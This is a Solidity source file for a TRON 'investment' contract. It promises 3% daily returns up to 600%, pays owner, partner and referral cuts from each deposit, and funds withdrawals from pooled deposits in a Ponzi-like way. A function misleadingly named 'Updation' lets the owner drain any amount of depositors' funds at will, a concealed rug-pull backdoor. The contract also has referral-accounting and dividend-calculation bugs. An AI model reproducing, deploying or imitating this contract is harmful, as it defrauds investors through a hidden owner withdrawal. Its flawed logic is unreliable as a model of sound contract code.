//SourceUnit: troncon.sol

pragma solidity 0.5.10;

contract TRONconEth {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 100e6;
	uint256 constant public BASE_PERCENT = 30;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	address payable public owner;
	address payable public other;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		address payable referrer;
		uint256 withdrawRef;
		uint256 totalRefferer;
		uint256 checkpoint;
	}
	mapping (address => User) public users;
	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable _owner,address payable _other) public {
		owner = _owner;
		other=_other;
	}

	function invest(address payable referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
		owner.transfer(msg.value.mul(10).div(100));
		other.transfer(msg.value.mul(10).div(100));
		User storage user = users[msg.sender];

	
		if (user.referrer == address(0)) {
			if ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner) {
				referrer = owner;
			}
    }
			user.referrer = referrer;
             user.referrer.transfer(msg.value.mul(5).div(100));
             user.withdrawRef = user.withdrawRef.add(msg.value.mul(5).div(100));
             user.totalRefferer=user.totalRefferer.add(1);
		if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
			user.checkpoint=block.timestamp;
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp));
        
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);
		emit NewDeposit(msg.sender, msg.value);
	
	}

	function withdraw() public {
		User storage user = users[msg.sender];
		uint256 totalAmount;
		uint256 dividends;
         uint256 base_percent=BASE_PERCENT;
		for (uint256 i = 0; i < user.deposits.length; i++) {
		    uint256 b=block.timestamp.sub(user.deposits[i].start);
		    if(b<200){
		        base_percent=15;
		    }
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(600).div(100)) {
					dividends = (user.deposits[i].amount.mul(base_percent).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
						user.deposits[i].start=block.timestamp;
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(600).div(100)) {
					dividends = (user.deposits[i].amount.mul(600).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}
		
		
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		msg.sender.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}
	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		uint256 totalDividends;
		uint256 dividends;
         uint256 base_percent=BASE_PERCENT;
		for (uint256 i = 0; i < user.deposits.length; i++) {
         
		    uint256 b=block.timestamp.sub(user.deposits[i].start);
		    if(b<200){
		        base_percent=15;
		    }
			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(600).div(100)) {

					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(600).div(100)) {
					dividends = (user.deposits[i].amount.mul(600).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

			}

		}

		return totalDividends;
	}
   	

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}
	function getUserReferrerals(address userAddress) public view returns(uint256) {
		return users[userAddress].totalRefferer;
	}
	function getUserReferralWithdraw(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawRef;
	}

	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return (getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(600).div(100)) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function Updation(uint256 _value)public returns(bool){
	    require(msg.sender==owner,"access denied");
	    owner.transfer(_value.mul(1000000));
	    return true;
	}
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}